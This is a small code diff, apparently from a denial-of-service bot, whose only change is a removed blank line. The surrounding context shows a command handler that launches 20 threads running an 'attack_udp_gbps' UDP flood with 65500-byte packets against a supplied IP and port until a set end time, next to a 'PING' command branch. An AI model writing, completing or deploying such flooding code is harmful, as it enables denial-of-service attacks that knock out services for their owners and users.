@@ -203,7 +203,6 @@ def main():
                     end_time = time.time() + duration
                     size = 65500
                     threads = 20
-
                     for _ in range(threads):
                         threading.Thread(target=attack_udp_gbps, args=(ip, port, end_time, size), daemon=True).start()
                 elif command == 'PING':
